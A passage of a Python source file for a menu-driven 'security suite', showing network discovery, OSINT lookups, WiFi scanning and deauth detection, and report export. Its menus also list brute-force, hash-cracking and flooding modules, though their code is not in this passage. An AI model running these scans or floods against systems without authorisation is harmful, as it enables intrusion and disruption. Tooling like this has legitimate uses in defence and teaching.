        print(f"  {GREEN}{SYM_CHECK} No reverse shell patterns detected.{RESET}")
    else:
        print(f"\n  {RED}{SYM_WARN} {len(found)} suspicious patterns!{RESET}")
    print()


def net_speed_test():
    box("Network Speed Test", Fore.BLUE)
    print(f"  {c('Testing download speed...', CYAN)}")
    separator(Fore.BLUE)
    test_urls = [
        "https://speed.cloudflare.com/__down?bytes=10000000",
        "https://proof.ovh.net/files/10Mb.dat",
        "http://speedtest.tele2.net/10MB.zip",
    ]
    best_speed = 0
    for url in test_urls:
        try:
            start = time.time()
            r = requests.get(url, timeout=15, stream=True)
            downloaded = 0
            for chunk in r.iter_content(chunk_size=8192):
                downloaded += len(chunk)
                if time.time() - start > 10:
                    break
            elapsed = time.time() - start
            speed = (downloaded * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            if speed > best_speed:
                best_speed = speed
            print(f"  {c(url[:50], GREEN)} {c(f'{speed:.2f} Mbps', CYAN)}")
        except Exception as e:
            print(f"  {c(url[:50], GREEN)} {c(f'Failed: {e}', RED)}")
    if best_speed > 0:
        print(f"\n  {c(f'Download: {best_speed:.2f} Mbps', GREEN)}")
        print(f"  {c('Note: Upload test not included (educational only).', YELLOW)}")
    print()


def net_mac_lookup():
    box("MAC Address Lookup", Fore.BLUE)
    mac = input(f"  {c(f'MAC address {SYM_PROMPT} ', CYAN)}").strip()
    if not mac:
        return
    mac_clean = re.sub(r'[:-]', '', mac.upper())[:6]
    oui_db = {
        "00:50:56": "VMware", "00:0C:29": "VMware", "00:05:69": "VMware",
        "08:00:27": "VirtualBox", "0A:00:27": "VirtualBox",
        "00:15:5D": "Microsoft (Hyper-V)", "00:1D:D8": "Microsoft",
        "3C:22:FB": "Apple", "00:16:3E": "Xen", "52:54:00": "QEMU",
        "00:1A:11": "Google", "00:1E:65": "Google",
        "F8:FF:C2": "Apple", "00:1A:2B": "Apple",
        "B8:27:EB": "Raspberry Pi", "DC:A6:32": "Raspberry Pi",
        "00:1E:C2": "Apple", "AC:DE:48": "Apple",
        "FC:FB:FB": "Apple", "18:E7:F4": "Apple",
        "00:25:00": "Apple", "78:7B:8A": "Apple",
    }
    prefix = mac_clean[:6]
    found = False
    for p, vendor in oui_db.items():
        if p.replace(":", "").upper() == prefix:
            print(f"\n  {c('MAC:', CYAN)} {mac}")
            print(f"  {c('Vendor:', GREEN)} {c(vendor, YELLOW)}")
            found = True
            break
    if not found:
        print(f"  {YELLOW}Vendor not found in built-in database.{RESET}")
        try:
            r = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if r.status_code == 200:
                print(f"  {c('Vendor:', GREEN)} {c(r.text, YELLOW)}")
        except Exception:
            pass
    print()


def net_lan_discovery():
    box("LAN Device Discovery", Fore.BLUE)
    if not check_root():
        print(f"  {YELLOW}Root recommended for ARP scan.{RESET}")
    iface = input(f"  {c(f'Subnet (e.g. 192.168.1.0/24) {SYM_PROMPT} ', CYAN)}").strip()
    if not iface:
        try:
            r = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True)
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', r.stdout)
            if m:
                ip = m.group(1)
                parts = ip.split(".")
                iface = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                print(f"  {c('Detected:', GREEN)} {iface}")
        except Exception:
            iface = "192.168.1.0/24"
    print(f"\n  {c(f'Scanning {iface}...', CYAN)}")
    separator(Fore.BLUE)
    devices = []
    if HAS_SCAPY and _is_root():
        try:
            arp = scapy.ARP(pdst=iface)
            bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            ans = scapy.srp(bc/arp, timeout=3, verbose=False)[0]
            for sent, received in ans:
                devices.append((received.psrc, received.hwsrc))
                print(f"    {c(received.psrc, GREEN):20s} {c(received.hwsrc, CYAN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        try:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+(\S+)', line)
                if m:
                    devices.append((m.group(1), m.group(2)))
                    print(f"    {c(m.group(1), GREEN):20s} {c(m.group(2), CYAN)}")
        except Exception:
            print(f"  {YELLOW}Install scapy + root for ARP scan, or check arp cache.{RESET}")
    print(f"\n  {c(f'Found {len(devices)} devices', GREEN)}")
    print()


def net_dhcp_scan():
    box("DHCP Scanner", Fore.BLUE)
    print(f"  {c('Scanning for DHCP servers...', CYAN)}")
    separator(Fore.BLUE)
    found = []
    try:
        r = subprocess.run(["nmap", "-sU", "-p", "67,68", "--open", "192.168.0.0/16"],
                          capture_output=True, text=True, timeout=120)
        for line in r.stdout.splitlines():
            m = re.match(r'^(\d+\.\d+\.\d+\.\d+).*open', line)
            if m:
                found.append(m.group(1))
                print(f"  {c(SYM_CHECK, GREEN)} {m.group(1)}")
    except Exception:
        pass
    if not found:
        print(f"  {YELLOW}No DHCP servers found (or nmap not available).{RESET}")
    print(f"\n  {c(f'Found {len(found)} DHCP servers', GREEN)}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 14: ADVANCED OSINT
# ──────────────────────────────────────────────────────────

def osint_shodan():
    box("Shodan Search", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    query = input(f"  {c(f'Search query {SYM_PROMPT} ', CYAN)}").strip()
    if not query:
        return
    api_key = input(f"  {c(f'API key (or empty for public info) {SYM_PROMPT} ', CYAN)}").strip()
    print(f"\n  {c(f'Searching Shodan: {query}', CYAN)}")
    separator(Fore.YELLOW)
    if api_key:
        try:
            r = requests.get(f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}", timeout=15)
            if r.status_code == 200:
                data = r.json()
                matches = data.get("matches", [])
                print(f"  {c(f'Found {len(matches)} results', GREEN)}")
                for item in matches[:10]:
                    ip = item.get("ip_str", "?")
                    port = item.get("port", "?")
                    org = item.get("org", "?")[:30]
                    product = item.get("product", "?")[:30]
                    print(f"    {c(ip, GREEN):16s} {c(str(port), CYAN):6s} {c(org, YELLOW):30s} {cdim(product, Fore.WHITE)}")
            else:
                print(f"  {RED}Error: {r.status_code}{RESET}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        print(f"  {YELLOW}No API key. Get one at https://account.shodan.io{RESET}")
        try:
            r = requests.get(f"https://internetdb.shodan.io/{query}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                print(f"  Ports: {c(str(data.get('ports', [])), GREEN)}")
                print(f"  Hostnames: {c(str(data.get('hostnames', [])), CYAN)}")
                print(f"  CPEs: {c(str(data.get('cpes', [])), YELLOW)}")
        except Exception:
            pass
    print()


def osint_ct_log():
    box("Certificate Transparency Log Search", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip()
    if not domain:
        return
    print(f"\n  {c(f'Searching CT logs for {domain}...', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
        if r.status_code == 200:
            data = r.json()
            print(f"  {c(f'Found {len(data)} certificates', GREEN)}")
            seen = set()
            for entry in data[:30]:
                name = entry.get("name_value", "")
                issuer = entry.get("issuer_name", "")[:40]
                not_after = entry.get("not_after", "")[:10]
                key = f"{name}:{issuer}"
                if key not in seen:
                    seen.add(key)
                    print(f"    {c(name, GREEN):50s} {c(issuer, CYAN)} {c(not_after, YELLOW)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def osint_btc_lookup():
    box("Bitcoin Address Lookup", Fore.YELLOW)
    addr = input(f"  {c(f'Bitcoin address {SYM_PROMPT} ', CYAN)}").strip()
    if not addr:
        return
    print(f"\n  {c(f'Looking up {addr}...', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://blockchain.info/rawaddr/{addr}", timeout=15)
        if r.status_code == 200:
            data = r.json()
            balance = data.get("final_balance", 0) / 100000000
            tx_count = data.get("n_tx", 0)
            total_received = data.get("total_received", 0) / 100000000
            total_sent = data.get("total_sent", 0) / 100000000
            lines = [
                f"  Address: {c(addr, GREEN)}",
                f"  Balance: {c(f'{balance:.8f} BTC', YELLOW)}",
                f"  Transactions: {c(str(tx_count), CYAN)}",
                f"  Total Received: {c(f'{total_received:.8f} BTC', GREEN)}",
                f"  Total Sent: {c(f'{total_sent:.8f} BTC', RED)}",
            ]
            info_box("Bitcoin Intel", lines, Fore.YELLOW)
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def osint_pastebin():
    box("Pastebin Search", Fore.YELLOW)
    query = input(f"  {c(f'Search term {SYM_PROMPT} ', CYAN)}").strip()
    if not query:
        return
    print(f"\n  {c('Searching for ' + repr(query) + '...', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://www.google.com/search?q=site:pastebin.com+{quote(query)}", timeout=10,
                         headers={"User-Agent": "Mozilla/5.0"})
        urls = re.findall(r'https?://pastebin\.com/\w+', r.text)
        unique = list(set(urls))[:10]
        if unique:
            print(f"  {c(f'Found {len(unique)} results', GREEN)}")
            for url in unique:
                print(f"    {c(url, GREEN)}")
        else:
            print(f"  {YELLOW}No results found.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def osint_github_dork():
    box("GitHub Dork Search", Fore.YELLOW)
    query = input(f"  {c(f'Search query {SYM_PROMPT} ', CYAN)}").strip()
    if not query:
        return
    print(f"\n  {c(f'Searching GitHub: {query}', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://api.github.com/search/repositories?q={quote(query)}&per_page=10", timeout=10,
                         headers={"Accept": "application/vnd.github.v3+json"})
        if r.status_code == 200:
            data = r.json()
            items = data.get("items", [])
            total = data.get("total_count", 0)
            print(f"  {c('Found ' + str(total) + ' repos (showing ' + str(len(items)) + ')', GREEN)}")
            for item in items:
                name = item.get("full_name", "?")
                desc = (item.get("description") or "")[:50]
                stars = item.get("stargazers_count", 0)
                print(f"    {c(name, GREEN):40s} {c(f'*{stars}', YELLOW)} {cdim(desc, Fore.WHITE)}")
        else:
            print(f"  {RED}Error: {r.status_code}{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def osint_dns_history():
    box("DNS History Check", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip()
    if not domain:
        return
    print(f"\n  {c(f'Checking DNS history for {domain}...', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://dnsHistory.org/api/dns/{domain}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            records = data if isinstance(data, list) else data.get("records", [])
            for rec in records[:20]:
                if isinstance(rec, dict):
                    date = rec.get("date", "?")
                    ip = rec.get("ip", rec.get("value", "?"))
                    print(f"    {c(str(date), CYAN):20s} {c(str(ip), GREEN)}")
        else:
            print(f"  {YELLOW}Trying alternative...{RESET}")
            try:
                r2 = requests.get(f"https://dnshistory.org/dns-records/{domain}", timeout=10,
                                 headers={"User-Agent": "Mozilla/5.0"})
                ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)', r2.text)
                if ips:
                    print(f"  {c('Historical IPs:', GREEN)}")
                    for ip in set(ips[:10]):
                        print(f"    {c(ip, GREEN)}")
            except Exception:
                print(f"  {RED}Could not fetch DNS history.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def osint_wayback():
    box("Wayback Machine Check", Fore.YELLOW)
    url = input(f"  {c(f'URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    print(f"\n  {c(f'Checking Wayback Machine for {url}...', CYAN)}")
    separator(Fore.YELLOW)
    try:
        r = requests.get(f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=20", timeout=15)
        if r.status_code == 200:
            data = r.json()
            if len(data) > 1:
                print(f"  {c(f'Found {len(data)-1} snapshots', GREEN)}")
                for row in data[1:15]:
                    timestamp = row[1] if len(row) > 1 else "?"
                    original = row[2] if len(row) > 2 else "?"
                    status = row[4] if len(row) > 4 else "?"
                    print(f"    {c(timestamp, CYAN)} {c(status, GREEN)} {c(original[:60], YELLOW)}")
            else:
                print(f"  {YELLOW}No snapshots found.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 15: WIFI & WIRELESS
# ──────────────────────────────────────────────────────────

def wifi_scan():
    box("WiFi Network Scanner", Fore.MAGENTA)
    print(f"  {c('Scanning for WiFi networks...', MAGENTA)}")
    separator(Fore.MAGENTA)
    try:
        if platform.system().lower() == "linux":
            subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
            r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
            cells = re.findall(r'Cell \d+', r.stdout)
            essids = re.findall(r'ESSID:"(.*?)"', r.stdout)
            signals = re.findall(r'Signal level=(-?\d+)', r.stdout)
            encs = re.findall(r'Encryption key:(on|off)', r.stdout)
            if essids:
                print(f"  {c(f'Found {len(essids)} networks:', GREEN)}\n")
                for i, (essid, enc) in enumerate(zip(essids, encs)):
                    sig = signals[i] if i < len(signals) else "?"
                    enc_type = "Encrypted" if enc == "on" else "Open"
                    color = RED if enc == "off" else GREEN
                    print(f"    {c(f'[{i+1}]', CYAN)} {c(essid, color):30s} {c(enc_type, YELLOW):12s} {c(f'Signal: {sig}dBm', CYAN)}")
            else:
                print(f"  {YELLOW}No networks found or permission denied.{RESET}")
        else:
            print(f"  {YELLOW}Use system WiFi tools on macOS/Windows.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def wifi_security_audit():
    box("WiFi Security Audit", Fore.MAGENTA)
    print(f"  {c('Checking WiFi security...', MAGENTA)}")
    separator(Fore.MAGENTA)
    issues = []
    try:
        r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
        essids = re.findall(r'ESSID:"(.*?)"', r.stdout)
        encs = re.findall(r'Encryption key:(on|off)', r.stdout)
        pairs = list(zip(essids, encs))
        for name, enc in pairs:
            if enc == "off":
                print(f"    {c(SYM_X, RED)} OPEN NETWORK: {c(name, RED)}")
                add_log_alert("WARN", "WiFi", f"Open network: {name}")
                issues.append(name)
            else:
                print(f"    {c(SYM_CHECK, GREEN)} Secured: {name}")
    except Exception:
        pass
    if issues:
        print(f"\n  {RED}{SYM_WARN} {len(issues)} open networks found!{RESET}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} All networks secured (or scan failed).{RESET}")
    print()


def wifi_deauth_monitor():
    box("Deauth Detection Monitor", Fore.MAGENTA)
    if not check_root(scapy_needed=True):
        return
    print(f"  {c('Monitoring for deauthentication frames...', MAGENTA)}")
    print(f"  {c('Ctrl+C to stop', YELLOW)}")
    separator(Fore.MAGENTA)
    if not HAS_SCAPY:
        print(f"  {RED}scapy required for this feature.{RESET}")
        return
    deauth_count = 0
    start = time.time()
    try:
        def detect_deauth(pkt):
            nonlocal deauth_count
            if pkt.haslayer(scapy.Dot11):
                if pkt.type == 0 and pkt.subtype == 12:
                    deauth_count += 1
                    ts = dt.now().strftime("%H:%M:%S")
                    print(f"  {c(f'[{ts}]', RED)} {SYM_WARN} DEAUTH: {pkt[scapy.Dot11].addr2} -> {pkt[scapy.Dot11].addr1}")
                    add_log_alert("CRITICAL", "Deauth", f"Deauth from {pkt[scapy.Dot11].addr2}")
        scapy.sniff(iface=None, prn=detect_deauth, timeout=30, store=False)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    elapsed = time.time() - start
    print(f"\n  {c(f'Monitoring complete: {deauth_count} deauth frames in {elapsed:.0f}s', CYAN)}")
    if deauth_count > 0:
        add_log_alert("WARN", "WiFi", f"{deauth_count} deauth frames detected")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 16: REPORT GENERATOR
# ──────────────────────────────────────────────────────────

def report_generate():
    box("Generate HTML Report", Fore.CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts to report. Run other modules first.{RESET}")
        return
    os.makedirs(SAVE_DIR, exist_ok=True)
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    report_path = os.path.join(SAVE_DIR, f"report_{ts}.html")
    severity_colors = {"CRITICAL": "#ff0000", "HIGH": "#ff6600", "WARN": "#ffaa00", "INFO": "#00aa00"}
    html_content = f"""<!DOCTYPE html>
<html><head><title>Darkie Security Suite v3.0 Report</title>
<style>
body {{ font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
h1 {{ color: #00ffff; border-bottom: 2px solid #00ffff; padding-bottom: 10px; }}
table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #111; color: #00ffff; }}
tr:nth-child(even) {{ background: #111; }}
.critical {{ color: #ff0000; font-weight: bold; }}
.high {{ color: #ff6600; }}
.warn {{ color: #ffaa00; }}
.info {{ color: #00aa00; }}
</style></head><body>
<h1>Darkie Security Suite v3.0 - Scan Report</h1>
<p>Generated: {dt.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
<p>Total Alerts: {len(LOG_ALERTS)}</p>
<table><tr><th>Timestamp</th><th>Level</th><th>Source</th><th>Message</th></tr>
"""
    for alert in LOG_ALERTS:
        level = alert["level"]
        css = level.lower() if level.lower() in severity_colors else "info"
        html_content += f'<tr><td>{alert["timestamp"]}</td><td class="{css}">{level}</td><td>{alert["source"]}</td><td>{alert["message"]}</td></tr>\n'
    html_content += "</table></body></html>"
    with open(report_path, "w") as f:
        f.write(html_content)
    print(f"  {GREEN}{SYM_CHECK} Report saved: {report_path}{RESET}")
    print(f"  {c(f'Total alerts: {len(LOG_ALERTS)}', CYAN)}")
    print()


def report_export_json():
    box("Export Alerts to JSON", Fore.CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts to export.{RESET}")
        return
    os.makedirs(SAVE_DIR, exist_ok=True)
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"alerts_{ts}.json")
    with open(path, "w") as f:
        json.dump(LOG_ALERTS, f, indent=2)
    print(f"  {GREEN}{SYM_CHECK} Saved: {path}{RESET}")
    print(f"  {c(f'Alerts: {len(LOG_ALERTS)}', CYAN)}")
    print()


def report_export_csv():
    box("Export Alerts to CSV", Fore.CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts to export.{RESET}")
        return
    os.makedirs(SAVE_DIR, exist_ok=True)
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"alerts_{ts}.csv")
    with open(path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["timestamp", "level", "source", "message"])
        writer.writeheader()
        writer.writerows(LOG_ALERTS)
    print(f"  {GREEN}{SYM_CHECK} Saved: {path}{RESET}")
    print(f"  {c(f'Alerts: {len(LOG_ALERTS)}', CYAN)}")
    print()


# ──────────────────────────────────────────────────────────
#  MENU SYSTEM
# ──────────────────────────────────────────────────────────

def menu_network_threat():
    while True:
        box("Network & Threat Monitoring", Fore.RED)
        print(f"  {c('[1]', GREEN)}  Packet Capture")
        print(f"  {c('[2]', GREEN)}  Traffic Monitor")
        print(f"  {c('[3]', GREEN)}  IDS Signatures")
        print(f"  {c('[4]', GREEN)}  ARP Detector")
        print(f"  {c('[5]', GREEN)}  Port Scan Detector")
        print(f"  {c('[6]', GREEN)}  DDoS Detection")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": net_capture, "2": net_traffic_monitor, "3": net_ids,
               "4": net_arp_detect, "5": net_portscan_detect, "6": net_ddos_detect}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_endpoint():
    while True:
        box("Endpoint Security", Fore.MAGENTA)
        print(f"  {c('[1]', GREEN)}  Process Monitor")
        print(f"  {c('[2]', GREEN)}  Suspicious Process Detector")
        print(f"  {c('[3]', GREEN)}  File Integrity Checker")
        print(f"  {c('[4]', GREEN)}  Network Connections")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": ep_process_monitor, "2": ep_suspicious_processes,
               "3": ep_file_integrity, "4": ep_network_connections}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_vuln():
    while True:
        box("Vulnerability Management", Fore.BLUE)
        print(f"  {c('[1]', GREEN)}  Port Scanner")
        print(f"  {c('[2]', GREEN)}  CVE Lookup")
        print(f"  {c('[3]', GREEN)}  Vulnerability Assessment")
        print(f"  {c('[4]', GREEN)}  Config Checker")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": vuln_advanced_scan, "2": vuln_cve_lookup,
               "3": vuln_assessment, "4": vuln_config_check}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_data():
    while True:
        box("Data Protection", Fore.YELLOW)
        print(f"  {c('[1]', GREEN)}  Encrypt/Decrypt")
        print(f"  {c('[2]', GREEN)}  Password Analyzer")
        print(f"  {c('[3]', GREEN)}  Brute-Force Detection")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": data_encrypt, "2": data_password_strength, "3": data_bruteforce_detect}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_pentest():
    while True:
        box("Ethical Hacking & Pentest", Fore.GREEN)
        print(f"  {c('[1]', GREEN)}  SQLi Detector")
        print(f"  {c('[2]', GREEN)}  XSS Scanner")
        print(f"  {c('[3]', GREEN)}  Path Traversal")
        print(f"  {c('[4]', GREEN)}  Subdomain Takeover")
        print(f"  {c('[5]', GREEN)}  HTTP Methods")
        print(f"  {c('[6]', GREEN)}  Brute-Force Login Tester")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": pentest_sqli, "2": pentest_xss, "3": pentest_path_traversal,
               "4": pentest_subdomain_takeover, "5": pentest_http_methods,
               "6": pentest_bruteforce_login}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_siem():
    while True:
        box("SIEM & Log Analysis", Fore.CYAN)
        print(f"  {c('[1]', GREEN)}  Log Analyzer")
        print(f"  {c('[2]', GREEN)}  Real-time Monitor")
        print(f"  {c('[3]', GREEN)}  Alert Dashboard ({c(len(LOG_ALERTS), YELLOW)})")
        print(f"  {c('[4]', GREEN)}  Threat Detection")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": siem_log_analyzer, "2": siem_realtime_monitor,
               "3": siem_alert_viewer, "4": siem_threat_patterns}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_stress():
    while True:
        box("Stress Testing", Fore.RED)
        print(f"  {c('[1]', GREEN)}  Minecraft Stress")
        print(f"  {c('[2]', GREEN)}  Web Stress [FIXED]")
        print(f"  {c('[3]', GREEN)}  IP Flood")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": stress_minecraft, "2": stress_web, "3": stress_ip}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_osint():
    while True:
        box("OSINT Reconnaissance", Fore.YELLOW)
        print(f"  {c('[1]', GREEN)}  Phone Lookup")
        print(f"  {c('[2]', GREEN)}  Email Lookup")
        print(f"  {c('[3]', GREEN)}  IP Geolocation")
        print(f"  {c('[4]', GREEN)}  DNS Enumeration")
        print(f"  {c('[5]', GREEN)}  Subdomain Discovery")
        print(f"  {c('[6]', GREEN)}  Social Username Search")
        print(f"  {c('[7]', GREEN)}  Website Tech Recon")
        print(f"  {c('[8]', GREEN)}  Whois Lookup")
        print(f"  {c('[9]', GREEN)}  Web Recon (Dir Brute)")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": osint_phone, "2": osint_email, "3": osint_ipgeo, "4": osint_dns,
               "5": osint_subdomain, "6": osint_social, "7": osint_website,
               "8": osint_whois, "9": legacy_web_recon}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_telephone():
    while True:
        box("Telephone Tools", Fore.MAGENTA)
        print(f"  {c('[1]', GREEN)}  Analyze Number")
        print(f"  {c('[2]', GREEN)}  Country Codes")
        print(f"  {c('[3]', GREEN)}  Format Number")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": tel_analyze, "2": tel_country_codes, "3": tel_format}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_netutils():
    while True:
        box("Network Utilities", Fore.BLUE)
        print(f"  {c('[1]', GREEN)}  Port Scanner")
        print(f"  {c('[2]', GREEN)}  SSL/TLS Checker")
        print(f"  {c('[3]', GREEN)}  HTTP Security Headers")
        print(f"  {c('[4]', GREEN)}  Ping")
        print(f"  {c('[5]', GREEN)}  Traceroute")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": legacy_portscan, "2": legacy_sslcheck, "3": legacy_httpheaders,
               "4": legacy_ping, "5": legacy_traceroute}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_hash_crypto():
    while True:
        box("Hash & Crypto Tools", Fore.CYAN)
        print(f"  {c('[1]', GREEN)}  Hash Generator")
        print(f"  {c('[2]', GREEN)}  Hash Identifier")
        print(f"  {c('[3]', GREEN)}  Hash Cracker (Dictionary)")
        print(f"  {c('[4]', GREEN)}  Encoder / Decoder")
        print(f"  {c('[5]', GREEN)}  Password Generator")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": hash_generator, "2": hash_identifier, "3": hash_cracker,
               "4": encoder_decoder, "5": password_generator}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_system_audit():
    while True:
        box("System Security Audit", Fore.RED)
        print(f"  {c('[1]', GREEN)}  Rootkit Detection")
        print(f"  {c('[2]', GREEN)}  SUID/SGID Scanner")
        print(f"  {c('[3]', GREEN)}  Cron Job Analyzer")
        print(f"  {c('[4]', GREEN)}  File Permissions Audit")
        print(f"  {c('[5]', GREEN)}  Open Ports Summary")
        print(f"  {c('[6]', GREEN)}  Failed Login Analyzer")
        print(f"  {c('[7]', GREEN)}  Kernel Hardening Check")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": audit_rootkit_detection, "2": audit_suid_scanner, "3": audit_cron_jobs,
               "4": audit_file_permissions, "5": audit_open_ports,
               "6": audit_failed_logins, "7": audit_kernel_hardening}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_adv_network():
    while True:
        box("Advanced Network", Fore.BLUE)
        print(f"  {c('[1]', GREEN)}  Port Knocking Tester")
        print(f"  {c('[2]', GREEN)}  Banner Grabbing")
        print(f"  {c('[3]', GREEN)}  Reverse Shell Detector")
        print(f"  {c('[4]', GREEN)}  Network Speed Test")
        print(f"  {c('[5]', GREEN)}  MAC Address Lookup")
        print(f"  {c('[6]', GREEN)}  LAN Device Discovery")
        print(f"  {c('[7]', GREEN)}  DHCP Scanner")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": net_port_knocking, "2": net_banner_grab, "3": net_reverse_shell_detect,
               "4": net_speed_test, "5": net_mac_lookup, "6": net_lan_discovery,
               "7": net_dhcp_scan}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_adv_osint():
    while True:
        box("Advanced OSINT", Fore.YELLOW)
        print(f"  {c('[1]', GREEN)}  Shodan Search")
        print(f"  {c('[2]', GREEN)}  Certificate Transparency Log")
        print(f"  {c('[3]', GREEN)}  Bitcoin Address Lookup")
        print(f"  {c('[4]', GREEN)}  Pastebin Search")
        print(f"  {c('[5]', GREEN)}  GitHub Dork Search")
        print(f"  {c('[6]', GREEN)}  DNS History Check")
        print(f"  {c('[7]', GREEN)}  Wayback Machine Check")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": osint_shodan, "2": osint_ct_log, "3": osint_btc_lookup,
               "4": osint_pastebin, "5": osint_github_dork, "6": osint_dns_history,
               "7": osint_wayback}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_wifi():
    while True:
